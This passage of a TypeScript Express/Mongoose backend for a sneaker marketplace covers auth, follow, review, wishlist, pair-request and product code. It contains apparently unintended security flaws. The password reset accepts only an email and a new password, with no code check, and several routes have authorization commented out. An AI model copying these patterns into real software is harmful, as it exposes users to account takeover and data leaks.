    //         'Server temporary unable please try again letter'
    //     );
    // }

    // Create JWT tokens
    const tokenPayload: IJwtPayload = {
        authId: user?._id,
        email: user?.email,
        profileId: user?.profile
    };

    const accessToken: string =  createToken(
            tokenPayload,
            config.jwt.secret as Secret,
            config.jwt.expires_in as SignOptions["expiresIn"]
        );

    // const refreshToken = createToken(
    //     jwtPayload,
    //     config.jwt_refresh_secret as string,
    //     config.jwt_refresh_expires_in as string
    // );

    return  {user,accessToken};
};

const sendVerifyCodeService = async (payload:{email: string}) => {
    const { email } = payload;

    const user = await AuthModel.findOne({ email: email });

    if (!user) {
        throw new ApiError(404, 'User not found to send otp');
    }

    const {code, expiredAt} = generateVerifyCode(10);

    
    user.verificationCode = code;

    await user.save();

    await sendVerificationEmail(email,{
        name: user.name,
        code: code
    });

    return null;
}

// reset password
const resetPasswordService = async (payload: IResetPassword) => {
    const { email, newPassword } = payload;

    const user = await AuthModel.findOne({ email: email });

    if (!user) {
        throw new ApiError(404, 'This user does not exist to reset password');
    }

    if (user.isBlocked) {
        throw new ApiError(403, 'This user is blocked. Cannot reset password');
    }

    //hash new password
    // const newHashedPassword = await bcrypt.hash(
    //     payload.password,
    //     Number(config.bcrypt_salt_rounds)
    // );

    user.password = newPassword;
    await user.save();

    //generate new token after password reset
    const tokenPayload: IJwtPayload = {
        authId: user?._id as string,
        email: user?.email,
        profileId: user?.name
    };

    const accessToken: string =  createToken(
        tokenPayload,
        config.jwt.secret as Secret,
        config.jwt.expires_in as SignOptions["expiresIn"]
    );

    // const refreshToken = createToken(
    //     jwtPayload,
    //     config.jwt_refresh_secret as string,
    //     config.jwt_refresh_expires_in as string
    // );

    return {user:{name:user.name,email:user.email}, accessToken };
};



const AuthServices = { 
    registerUserService,
    loginUserService,
    verifyCode,
    sendVerifyCodeService,
    resetPasswordService
};
export default AuthServices;
```

## File: src/app/module/Engagement/Engagement.service.ts
```typescript
import mongoose from "mongoose";
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import RetailerModel from "../Retailer/Retailer.model";
import { IReview } from "./Engagement.interface";
import { FollowModel, FollowUserModel, ReviewModel, WishListModel } from "./Engagement.model";
import BuyerModel from "../Buyer/Buyer.model";

//follow retailer

const followRetailerService = async (userDetails: IJwtPayload ,retailerId: string) => {

    const { profileId } = userDetails;

    // Check if the follow relationship already exists
    const existingFollow = await FollowModel.findOne({ buyerId: profileId, retailerId }).lean();

    if (existingFollow) {
        throw new ApiError(400, "You are still following this retailer.");
    }

    // Create a new follow relationship
    const newFollow = new FollowModel({
        buyerId: profileId,
        retailerId,
    });

    
    await newFollow.save();

    //increment the followers count of the retailer
    await RetailerModel.findByIdAndUpdate(retailerId, { $inc: { followersCount: 1 } });

    return null;

};

const unfollowRetailerService = async (userDetails: IJwtPayload ,retailerId: string) => {
    
    const { profileId } = userDetails;
    
    // Check if the follow relationship exists
    const existingFollow = await FollowModel.findOne({ buyerId: profileId, retailerId });
    
    if (!existingFollow) {
        throw new ApiError(400, "You are not following this retailer.");
    }
    
    // Remove the follow relationship
    await FollowModel.deleteOne({ buyerId: profileId, retailerId });
    
    // Decrement the followers count of the retailer
    await RetailerModel.findByIdAndUpdate(retailerId, { $inc: { followersCount: -1 } });
    
    return null;
    
}


//follow buyer/user

const followUserService = async (userDetails: IJwtPayload ,receiverId: string) => {

    const { profileId } = userDetails;

    if (profileId === receiverId) {
        throw new ApiError(
        400,
        "You cannot follow yourself"
        );
    }

  // Validate ObjectIds (optional but recommended)
  if (
    !mongoose.Types.ObjectId.isValid(profileId) ||
    !mongoose.Types.ObjectId.isValid(receiverId)
  ) {
    throw new ApiError(
      400,
      "Invalid user id"
    );
  }

  // Check existing follow relationship
  const existingFollow = await FollowUserModel.findOne({
    senderId: profileId,
    receiverId,
  });

//   const existingRelationship = await FollowUserModel.findOne({
//         $or: [
//             { senderId: profileId, receiverId },
//             { senderId: receiverId, receiverId: profileId },
//         ],
//     });

  if (existingFollow) {
    throw new ApiError(
      400,
      "You are already following this user."
    );
  }

  // Create follow
  const follow = await FollowUserModel.create({
    senderId: profileId,
    receiverId,
  });

  return follow;
};

const getNearbyUser = async (query: Record<string,unknown>) => {

    const { latitude, longitude} = query;

    if (typeof latitude !== "number" || typeof longitude !== "number" ) {
        throw new ApiError(400, "Invalid query parameters. Latitude, longitude");
    }

    const maxDistance = 10000; // Set a default max distance (in meters) for nearby retailers

    const nearbyUsers = await BuyerModel.find({
        // isApproved: true, // Only include approved retailers    
        location: {
            $near: {
                $geometry: {
                    type: "Point",
                    coordinates: [longitude, latitude],
                },
                $maxDistance: maxDistance,
            },
        },
    }).select("name address shoeSize").lean();

    return nearbyUsers;

    
};

const getAllFollowingUser = async (userDetails: IJwtPayload ) => {

    const { profileId } = userDetails;

    const following = await FollowUserModel.find({senderId: profileId})
        .populate({path:"receiverId", select:"name address shoeSize"})
            .lean();

    return following;
};

const getAllFollower = async (userDetails: IJwtPayload ) => {

    const { profileId } = userDetails;

    const followers = await FollowUserModel.find({receiverId: profileId})
        .populate({path:"senderId", select:"name address shoeSize"})
            .lean();

    return followers;
};

const getFollowUserDetails = async (userId: string) => {

    // const { profileId } = userDetails;

    const user = await BuyerModel.findById(userId)

            .lean();

    return user;
};



//reviewservice to add review and rating for a retailer by a buyer

const addReviewService = async (userDetails: IJwtPayload, payload: IReview) => {

    const { profileId } = userDetails;

    const { retailerId, productId, content, customerServiceRating, authenticityRating, pickupSpeedRating, priceRating, storeExperienceRating, staffHelpfulnessRating } = payload;

    const retailerObjectId = new mongoose.Types.ObjectId(retailerId);

    // Check if the review already exists for the same buyer, retailer and product
    const existingReview = await ReviewModel.findOne({ buyerId: profileId, retailerId, productId });

    if (existingReview) {
        throw new ApiError(400, "You have already reviewed this product for this retailer.");
    }

    //determine the overall rating based on the individual ratings
    const overallRating = Math.round((customerServiceRating + authenticityRating + pickupSpeedRating + priceRating + storeExperienceRating + staffHelpfulnessRating) / 6);

    if (overallRating < 1 || overallRating > 5) {
        throw new ApiError(400, "Overall rating must be between 1 and 5.");
    }


    // Create a new review
    const newReview = await ReviewModel.create({
        buyerId: profileId,
        retailerId,
        productId,
        content,
        overallRating,
        customerServiceRating,
        authenticityRating,
        pickupSpeedRating,
        priceRating,
        storeExperienceRating,
        staffHelpfulnessRating
    });

    // Update the retailer's average rating
    // const reviews = await ReviewModel.find({ retailerId });
    // const totalRating = reviews.reduce((sum, review) => sum + review.overallRating, 0);
    // const averageRating = totalRating / reviews.length;

    // await RetailerModel.findByIdAndUpdate(retailerId, { averageRating });

    await ReviewModel.aggregate([
        {
            $match: {
            retailerId: retailerObjectId,
            },
        },
        {
            $group: {
            _id: "$retailerId",
            averageRating: { $avg: "$overallRating" },
            },
        },
        {
            $merge: {
            into: "retailers", // your retailer collection name
            on: "_id",
            whenMatched: [
                {
                $set: {
                    averageRating: "$averageRating",
                },
                },
            ],
            whenNotMatched: "discard",
            },
        },
    ]);

    return null;

}


// wishlist service to add a product to wishlist of a buyer

const addToWishlistService = async (userDetails: IJwtPayload, payload: { retailerId: string, productId: string }) => {

    const { profileId } = userDetails;

    const { retailerId, productId } = payload;

    // Check if the product is already in the wishlist
    const existingWishlistItem = await WishListModel.findOne({ buyerId: profileId, retailerId, productId });

    if (existingWishlistItem) {
        throw new ApiError(400, "This product is already in your wishlist.");
    }

    // Create a new wishlist item
    const newWishlistItem =  WishListModel.create({
        buyerId: profileId,
        retailerId,
        productId,
    });

    if(!newWishlistItem){
        throw new ApiError(500, "Failed to add product to wishlist.");
    }
    
    return null;

}

const addToWantedlistService = async (wishListId: string) => {

    const wishListItem = await WishListModel.findById(wishListId);

    if(!wishListItem){
        throw new ApiError(404, "Wishlist item not found to make wanted.");
    }

    wishListItem.isWanted = true;

    await wishListItem.save();

    
    
    return null;

}

const removeFromWishlistService = async (wishListId: string) => {

    const wishListItem = await WishListModel.findById(wishListId);

    if(!wishListItem){
        throw new ApiError(404, "Wishlist item not found to remove from wishlist.");
    }

    await WishListModel.findByIdAndDelete(wishListId);

    return null;

}

//get buyer wishlist data
const getBuyerWishList = async (userDetails: IJwtPayload) => {
    const {profileId} = userDetails;

    const wishListProduct = await WishListModel.find({buyerId: profileId, isWanted: false})
        .populate({path:"productId", select: "name images"})
        .sort({createdAt: -1})
            .lean();

    return wishListProduct;
}

//get buyer wishlist data
const getBuyerWantedList = async (userDetails: IJwtPayload) => {
    const {profileId} = userDetails;

    const wishListProduct = await WishListModel.find({buyerId: profileId, isWanted: true})
        .populate({path:"productId", select: "name images"})
        .sort({createdAt: -1})
            .lean();

    return wishListProduct;
}

const EngagementServices = { 
    followRetailerService, 
    unfollowRetailerService ,

    followUserService,
    getNearbyUser,
    getAllFollower,
    getAllFollowingUser,
    getFollowUserDetails,

    addToWishlistService,
    addReviewService,
    addToWantedlistService,
    removeFromWishlistService

};

export default EngagementServices;
```

## File: src/app/module/Pairs/Pairs.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import PairsServices from "./Pairs.service";

const addNewPairsController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const files = req.files as Express.Multer.File[];

    const result = await PairsServices.addNewPairsToReseller(user,files, req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "New pairs added successfully.",
        data: result,
    });
});

const editPairsController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const files = req.files as Express.Multer.File[];

    const result = await PairsServices.editPairsDetails(user, req.params.id, files, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Pairs updated successfully.",
        data: result,
    });
});

const getAllListedPairsController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PairsServices.getMyListedPairs(user, req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Listed pairs retrieved successfully.",
        data: result,
    });
});

const getSinglePairDetailsController = catchAsync(async (req, res) => {

    // const { user } = req as AuthRequest;

    const result = await PairsServices.getSinglePairDetails(req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved pair details.",
        data: result,
    });
});

const makeRequestForPairController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PairsServices.makeRequestForPairService(user, req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Pair request submitted successfully.",
        data: result,
    });
});

const getAllRetailerPairRequestController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PairsServices.getAllPairRequestsForRetailer(user, req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Pair requests retrieved successfully.",
        data: result,
    });
});


const getAllpairRequestController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PairsServices.getAllPairRequestsForReseller(user, req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Pair requests retrieved successfully.",
        data: result,
    });
});

const getSinglePairRequestDetails = catchAsync(async (req, res) => {

    // const { user } = req as AuthRequest;

    const result = await PairsServices.getSInglePairRequestService(req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved a pair requests details.",
        data: result,
    });
});

const acceptPairRequestController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PairsServices.acceptPairRequest(user, req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Pair request accepted successfully.",
        data: result,
    });
});

const rejectPairRequestController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PairsServices.rejectPairRequest(user, req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "P",
        data: result,
    });
});

const proposeCounterOfferToPairRequestController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PairsServices.proposeCounterOfferToPairRequest(user, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Counter offer proposed successfully.",
        data: result,
    });
});

const PairsController = { 
    addNewPairsController,
    editPairsController,
    getAllListedPairsController,
    getSinglePairDetailsController,

    makeRequestForPairController,
    getAllRetailerPairRequestController,

    getAllpairRequestController,
    getSinglePairRequestDetails,
    acceptPairRequestController,
    rejectPairRequestController,
    proposeCounterOfferToPairRequestController
 };

export default PairsController;
```

## File: src/app/module/Pairs/Pairs.interface.ts
```typescript
import { Types } from "mongoose";

export interface IPairs {
    resellerId: Types.ObjectId;
    name: string;
    images: string[];
    type: string,
    brand: string;
    styleCode: string;
    details: string;
    color: string;
    variant: {
        gender: string;
        size: string;
        stock: number
    }[];
    askingPrice: number;
    // size: number;
    sneakerAttributes?: {};
    tshirtAttributes?: {};
    condition?: string;
    isVisibleToStore: boolean;
    isShowAskingPrice: boolean;
    isAllowDirectRequest: boolean;
    isSold: boolean;
    createdAt: Date;
}

export interface IOfferHistory {
    offeredBy: "Retailer" | "Reseller";
    price: number;
    // note?: string;
    createdAt: Date;
}

export interface IPairRequest {
    resellerId: Types.ObjectId;
    retailerId: Types.ObjectId;
    pairId: Types.ObjectId;
    quantity: number;
    variant: {
        gender: string;
        size: number;
    }[];
    askingPrice: number;
     offerHistory: IOfferHistory[];
    // unitPrice: number;
    // totalPrice: number;
    status: string;
    note: string;
    validity: {
        validForHours: number;
        from: Date;
        to: Date;
    };
    dealCompletionType: string;
    createdAt: Date;
}
```

## File: src/app/module/Pairs/Pairs.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IPairRequest, IPairs } from "./Pairs.interface";
import { ENUM_PAIR_REQUEST_STATUS, ENUM_PRODUCT_TYPE, ENUM_USER_Type } from "../../../utilities/enum";



const PairsSchema = new Schema<IPairs>({
    resellerId: { type: Schema.Types.ObjectId, ref: "Reseller", required: true },
    type: { type: String, enum: Object.values(ENUM_PRODUCT_TYPE), default: ENUM_PRODUCT_TYPE.SNEAKERS},
    name: { type: String, required: true },
    images: [{ type: String, default: [] }],
    brand: { type: String, required: true },

    styleCode: { type: String, default: "" },
    details: { type: String, default: "" },
    // color: { type: String, default: "" },
    variant: [{
        gender: { type: String, required: true },
        size: { type: String, required: true },
        stock: { type: Number, required: true },
    }],
    sneakerAttributes: {
      // modelName: String,
      // releaseYear: Number,
      color: {type: String, default: ""},
      condition: {
        type: String,
        enum: ["New", "Used", "Deadstock",],
        default: "New"
      },
      // upperMaterial: String,
      // soleMaterial: String,
      // closureType: String,
    },

    tshirtAttributes: {
      fit: {
        type: String,
        enum: ["Regular", "Slim", "Oversized", "Relaxed"],
        default: "Regular"
      },
      material: {type: String, default: ""},
      care: {
        type: String,
        default: ""
        // enum: ["CREW_NECK", "V_NECK", "POLO", "ROUND_NECK"],
      },
      season: {
        type: String,
        default: ""
        // enum: ["SHORT_SLEEVE", "LONG_SLEEVE", "SLEEVELESS"],
      },
      // gsm: Number,
    },
    askingPrice: { type: Number, required: true },
    // size: { type: Number, required: true },
    // condition: { 
    //     type: String, 
    //     enum: ["New", "Never worn", "Worn once", "Worn few times", "Used - Good condition", "Used - Fair condition"],
    //     default: "New"
    // },
    isVisibleToStore: { type: Boolean, default: true },
    isShowAskingPrice: { type: Boolean, default: true },
    isAllowDirectRequest: { type: Boolean, default: false },
    isSold: { type: Boolean, default: false },
}, { timestamps: true });


const pairRequestSchema = new Schema<IPairRequest>({
    resellerId: { type: Schema.Types.ObjectId, ref: "Reseller", required: true },
    retailerId: { type: Schema.Types.ObjectId, ref: "Retailer", required: true },
    pairId: { type: Schema.Types.ObjectId, ref: "Pairs", required: true },
    quantity: { type: Number, default: 1 },
    variant: [{
        gender: { type: String, default: "" },
        size: { type: Number, default: 0 }
    }],
    askingPrice: { type: Number, required: true },
    // unitPrice: { type: Number, required: true },
    // totalPrice: { type: Number, required: true },
    offerHistory: [
        {
            offeredBy: { type: String, enum: Object.values(ENUM_USER_Type), required: true },
            price: { type: Number, required: true },
            // note: { type: String },
            createdAt: { type: Date, default: Date.now }
        }
    ],
    status: { type: String, enum: Object.values(ENUM_PAIR_REQUEST_STATUS), default: ENUM_PAIR_REQUEST_STATUS.PENDING },
    note: { type: String },
    validity: {
        validForHours: { type: Number, required: true }, 
        from: { type: Date, required: true },
        to: { type: Date, required: true }
    },
    dealCompletionType: { type: String, enum: ["Meetup", "Store dropoff","Shipping","Direct"], default: "Meetup" }
}, { timestamps: true });



const PairsModel = models.Pairs || model<IPairs>("Pairs", PairsSchema);

const PairRequestModel = models.PairRequest || model<IPairRequest>("PairRequest", pairRequestSchema);

export { PairsModel, PairRequestModel };
```

## File: src/app/module/Pairs/Pairs.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import PairsValidations from "./Pairs.validation";
import PairsController from "./Pairs.controller";
import { uploadProfile } from "../../middlewares/multerMiddleware";


const PairsRouter = express.Router();

PairsRouter.post(
    "/add-new-pairs",
    authorizeUser,
    uploadProfile.array("pair-image",8),
    validateRequest(PairsValidations.addnewPairValidationSchema),
    PairsController.addNewPairsController
);

PairsRouter.patch(
    "/edit-pairs/:id",
    authorizeUser,
     uploadProfile.array("pair-image",8),
    // validateRequest(PairsValidations.addnewPairValidationSchema),
    PairsController.editPairsController
);


//get my listed pair
PairsRouter.get(
    "/get-listed-pairs",
    authorizeUser,
    // validateRequest(PairsValidations.addNewPairsZodSchema),
    PairsController.getAllListedPairsController
);


PairsRouter.get(
    "/get-single-pair/:id",
    // authorizeUser,
    // validateRequest(PairsValidations.addNewPairsZodSchema),
    PairsController.getSinglePairDetailsController
);

//retailer

PairsRouter.post(
    "/request-new-pair",
    authorizeUser,
    validateRequest(PairsValidations.makeRequestForPairValidationSchema),
    PairsController.makeRequestForPairController
);

PairsRouter.post(
    "/get-retailer-pair-request",
    authorizeUser,
    // validateRequest(PairsValidations.makeRequestForPairValidationSchema),
    PairsController.getAllRetailerPairRequestController
);


//reseller
//get all pair request

PairsRouter.get(
    "/get-pair-requests",
    authorizeUser,
    // validateRequest(PairsValidations.addNewPairsZodSchema),
    PairsController.getAllpairRequestController
);

PairsRouter.get(
    "/get-single-pair-request/:id",
    // authorizeUser,
    // validateRequest(PairsValidations.addNewPairsZodSchema),
    PairsController.getSinglePairRequestDetails
);

PairsRouter.post(
    "/accept-pair-request/:id",
    authorizeUser,
    // validateRequest(PairsValidations.addNewPairsZodSchema),
    PairsController.acceptPairRequestController
);

PairsRouter.post(
    "/reject-pair-request/:id",
    authorizeUser,
    // validateRequest(PairsValidations.addNewPairsZodSchema),
    PairsController.rejectPairRequestController
);

PairsRouter.post(
    "/propose-counter-offer",
    authorizeUser,
    // validateRequest(PairsValidations.addNewPairsZodSchema),
    PairsController.proposeCounterOfferToPairRequestController
);


export default PairsRouter;
```

## File: src/app/module/Product/Product.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IProduct, IProductVariant, IRecentSearch } from "./Product.interface";
import { ENUM_PRODUCT_AVAILABILITY, ENUM_PRODUCT_TYPE } from "../../../utilities/enum";
import { getAvailability } from "../../middlewares/mongooseMiddleware";


//Product schema
const ProductSchema = new Schema<IProduct>({
    retailerId: { type: Schema.Types.ObjectId, required: true, ref: "Retailer" },
    type: { type: String, enum: Object.values(ENUM_PRODUCT_TYPE), default: ENUM_PRODUCT_TYPE.SNEAKERS },
    name: { type: String, required: true },
    description: { type: String, default: "" },
    price: { type: Number, required: true },
    images: { type: [String], default: [] },
    brand: { type: String, default: "" },
    // variant: [{ type: Object, default: {} }],
    // color: { type: String, default: "" },
    styleCode: { type: String, default: "" },
    sneakerAttributes: {
      // modelName: String,
      // releaseYear: Number,
      colorway: {type: String, default: ""},
      condition: {
        type: String,
        enum: ["New", "Used", "Deadstock",],
      },
      // upperMaterial: String,
      // soleMaterial: String,
      // closureType: String,
    },

    tshirtAttributes: {
      fit: {
        type: String,
        enum: ["Regular", "Slim", "Oversized", "Relaxed"],
      },
      material: {type: String, default: ""},
      care: {
        type: String,
        default: ""
        // enum: ["CREW_NECK", "V_NECK", "POLO", "ROUND_NECK"],
      },
      season: {
        type: String,
        default: ""
        // enum: ["SHORT_SLEEVE", "LONG_SLEEVE", "SLEEVELESS"],
      },
      // gsm: Number,
    },
    availability: { type: String, enum: Object.values(ENUM_PRODUCT_AVAILABILITY), default: ENUM_PRODUCT_AVAILABILITY.ACTIVE },
    totalSearchCount: { type: Number, default: 0 },
}, { timestamps: true });

// Pre-save middleware to set availability based on stock
// ProductSchema.pre("save", function (next) {
//     this.availability = getAvailability(this.variant);
//     next();
// });

const ProductVariantSchema = new Schema<IProductVariant>(
  {
    productId: {
      type: Schema.Types.ObjectId,
      ref: "Product",
      required: true,
    },

    retailerId: {
      type: Schema.Types.ObjectId,
      ref: "Retailer",
      required: true,
    },

    size: {
      type: String,
      required: true,
    },

    color: {
      type: String,
      // required: true,
      default: ""
    },

    sku: {
      type: String,
      // required: true,
      // unique: true,
      default: null
    },

    price: {
      type: Number,
      default: 0,
    },

    stock: {
      type: Number,
      required: true,
      default: 0,
    },

    reservedStock: {
      type: Number,
      // required: true,
      default: 0,
    },

    isActive: {
      type: Boolean,
      default: true,
    },
  },
  { timestamps: true }
);


//recent search schema
const RecentSearchSchema = new Schema<IRecentSearch>(
  {
    buyerId: {
      type: String,
      required: true,
      index: true,
    },

    keyword: {
      type: String,
      required: true,
    },

    searchedAt: {
      type: Date,
      default: Date.now,
    },
  },
//   {
//     timestamps: true,
//   }
);


const ProductModel = models.Product || model<IProduct>("Product", ProductSchema);

const ProductVariantModel = models.ProductVariant || model<IProductVariant>("ProductVariant", ProductVariantSchema);

const RecentSearchModel = models.RecentSearch || model<IRecentSearch>("RecentSearch", RecentSearchSchema);

export { 
  ProductModel, 
  ProductVariantModel, 
  RecentSearchModel 
};

// export  ProductModel;
```

## File: src/app/module/Product/Product.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import ProductValidations from "./Product.validation";
import ProductController from "./Product.controller";
import { check } from "zod/v4/mini";
import { uploadProfile } from "../../middlewares/multerMiddleware";


const ProductRouter = express.Router();

ProductRouter.post(
    "/add-new-product",
    authorizeUser,
    // uploadProfile.array("product-image",8),
    validateRequest(ProductValidations.addNewProductValidation),
    ProductController.addProductController
);

ProductRouter.patch(
    "/edit-product/:id",
    authorizeUser,
    uploadProfile.array("product-image",8),
    // validateRequest(ProductValidations.addNewProductValidation),
    ProductController.editProductController
);

ProductRouter.delete(
    "/delete-product/:id",
    authorizeUser,
    // uploadProfile.array("product-image",8),
    // validateRequest(ProductValidations.addNewProductValidation),
    ProductController.deleteProductController
);

ProductRouter.get(
    "/search-product",
    authorizeUser,
    // validateRequest(ProductValidations.searchProductsZodSchema, "query"),
    ProductController.searchProductsController
);

ProductRouter.get(
    "/trending-and-recent-searches",
    authorizeUser,
    ProductController.getTrendingNowAndRecentSearchesController
);

ProductRouter.get(
    "/get-product-detail/:id",
    ProductController.getProductDetailByIdController
);

ProductRouter.delete(
    "/delete-recent-search/:id",
    authorizeUser,
    ProductController.deleteRecentSearchController
);

export default ProductRouter;


// check out : 5:22 PM

// Today worked on new feature development scope and also attended meeting for clarification.

// Also checked Binksanders(micro learning platform) project’s working flow and attended meeting to clarify client's recent feedback. 

// project : Sneaker Hub 
// git: https://github.com/SoubirSaian/sneaker-hub-backend
// Today checked some already build api in postman
```

## File: src/app/module/Reseller/Reseller.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import ResellerValidations from "./Reseller.validation";
import ResellerController from "./Reseller.controller";
import { uploadProfile } from "../../middlewares/multerMiddleware";


const ResellerRouter = express.Router();

ResellerRouter.get(
    "/reseller-homepage-stat-data",
    authorizeUser,
    ResellerController.resellerHomePageStatDataController
);

ResellerRouter.post(
    "/make-pair-request",
    authorizeUser,
    validateRequest(ResellerValidations.makeRequestForPairValidationSchema),
    ResellerController.proposeAnOfferToResellerForPairRequestController
);

ResellerRouter.patch(
    "/update-reseller-profile",
    authorizeUser,
    uploadProfile.single("profile-image"),
    ResellerController.updateResellerProfile
);



export default ResellerRouter;
```

## File: src/app/module/Retailer/Retailer.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import RetailerServices from "./Retailer.service";

const filterNearbyRetailersController = catchAsync(async (req, res) => {

    const result = await RetailerServices.filterNearbyRetailers(req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Nearby retailers retrieved successfully.",
        data: result,
    });
});

const getAllNearbyRetailerForMap = catchAsync(async (req, res) => {

    const result = await RetailerServices.getAllNearbyRetailersForMap(req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Nearby retailers for map retrieved successfully.",
        data: result,
    });
});

const getRetailerInventoryController = catchAsync(async (req, res) => {
    const { user } = req as AuthRequest;

    const result = await RetailerServices.getRetailerInventory(user,req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retailer inventory retrieved successfully.",
        data: result,
    });
});

const getRetailerAllOrdersController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await RetailerServices.getAllOrdersOfRetailer(user, req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "All orders of the retailer retrieved successfully.",
        data: result,
    });
});

const toggleRetailerOperationHourController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await RetailerServices.toggleOperationHour(user, req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Operation hour toggled successfully.",
        data: result,
    });
});

const updateRetailerProfile = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    console.log("req.files:",req.files);

    const files = req.files as {
        [fieldname: string]: Express.Multer.File[];
    };

    console.log("files:",files)

    const profileImage = files?.["profile-image"]?.[0];
    const coverImage = files?.["cover-image"]?.[0];

    const result = await RetailerServices.updateRetailerProfileService(user,profileImage,coverImage, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retailer profile updated.",
        data: result,
    });
});

const addVerificationInfo = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    console.log("req.files:",req.files);

    const files = req.files as {
        [fieldname: string]: Express.Multer.File[];
    };

    console.log("files:",files)

    const license = files?.["retailer-file"]?.[0];
    const coverImage = files?.["cover-image"]?.[0];

    const result = await RetailerServices.addRetailerLicense(user,license,coverImage, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Added verification info.",
        data: result,
    });
});



//branch

const addNewBranchController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const files = req.files as {
        [fieldname: string]: Express.Multer.File[];
    };

    const profileImage = files?.["profile-image"]?.[0];
    const coverImage = files?.["cover-image"]?.[0];

    const result = await RetailerServices.addNewBranch(user,profileImage,coverImage, req.query);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "New branch created successfully.",
        data: result,
    });
});

const getAllBranchController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await RetailerServices.getAllBranch(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved all branch.",
        data: result,
    });
});

const RetailerController = { 
    filterNearbyRetailersController,
    getAllNearbyRetailerForMap,

    getRetailerInventoryController,
    getRetailerAllOrdersController,

    toggleRetailerOperationHourController,
    updateRetailerProfile,
    addVerificationInfo,
    
    addNewBranchController,
    getAllBranchController,
};

export default RetailerController;
```

## File: src/app/module/User/User.model.ts
```typescript
import { model, models, Schema } from "mongoose";
import { IUser } from "./User.interface";
// import { ENUM_USER_STATUS } from "../../../utilities/enum";



const UserSchema = new Schema<IUser>({
    auth: { type: Schema.Types.ObjectId, ref: "Auth" },
    couple: { type: Schema.Types.ObjectId, ref: "Couple", default: null },
    partner: { type: Schema.Types.ObjectId, ref: "User", default: null },
    status: {
        type: String,

        default: ''
    },
    name: {
        type: String,
        default: '',
        required: [true,"Name is required"],
    },
    email: {
        type: String,
        required: [true,"email is required"],
    },
    // phone: {
    //     type: String,
    //     default: ''
    // },
    image: {
        type: String,
        default: ''
    },
    desireMood: {
        imoji: {type: String, default: ''},
        mood: {type: String, default: ''},
    },
    firstMeet:{
        type: Date,
        default: Date.now
    },
    nextMeet:{
        type: Date,
        default: Date.now
    },
    importantDays: [{
        label: {type: String, default: ''},
        image: {type: String, default: ''},
        date: {type: Date, default: Date.now},
    }],
    
    city:{
        type: String,
        default: ''
    },
    // country:{
    //     type: String,
    //     default: ''
    // },
    isLongDistance: {
        type: Boolean,
        default: false
    },
    isConnected: {
        type: Boolean,
        default: false
    },
    subscription: {
        isSubscribed: { type: Boolean, default: false },
        subscriptionId: { type: Schema.Types.ObjectId, ref: "SubscriptionPlan", default: null },
        subscriptionName: { type: String, default: '' },
        subscribedAt: { type: Date, default: null },
        expiredAt: { type: Date, default: null }
    },
    
    
}, { timestamps: true });



const UserModel = models.User || model<IUser>("User", UserSchema);

export default UserModel;
```

## File: package.json
```json
{
  "name": "sneakerhub-app",
  "version": "1.0.0",
  "description": "it's a backend server based on node and express. This project is basically a ecommerce site focused on to sell sneaker.",
  "main": "index.js",
  "scripts": {
    "dev": "nodemon --watch src --exec ts-node src/server.ts",
    "build": "tsc",
    "start": "node dist/server.js",
    "create-module": "ts-node src/app/create_module_tem.ts module"
  },
  "keywords": [],
  "author": "Soubir Saian Mallick",
  "license": "ISC",
  "type": "commonjs",
  "devDependencies": {
    "@types/bcrypt": "^6.0.0",
    "@types/cookie-parser": "^1.4.10",
    "@types/cors": "^2.8.19",
    "@types/express": "^5.0.5",
    "@types/jsonwebtoken": "^9.0.10",
    "@types/multer": "^2.0.0",
